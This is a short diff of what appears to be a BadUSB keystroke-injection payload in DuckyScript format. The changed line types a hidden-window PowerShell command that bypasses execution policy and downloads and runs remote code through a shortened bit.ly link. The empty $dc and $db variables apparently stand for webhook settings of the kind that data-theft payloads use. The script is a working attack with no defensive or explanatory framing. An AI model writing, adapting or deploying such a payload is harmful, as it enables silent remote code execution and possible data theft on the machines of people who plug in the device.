@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';$db='';irm # | iex
+STRING powershell -w h -ep bypass $dc='';$db='';irm bit.ly/42TvUTJ | iex
 ENTER
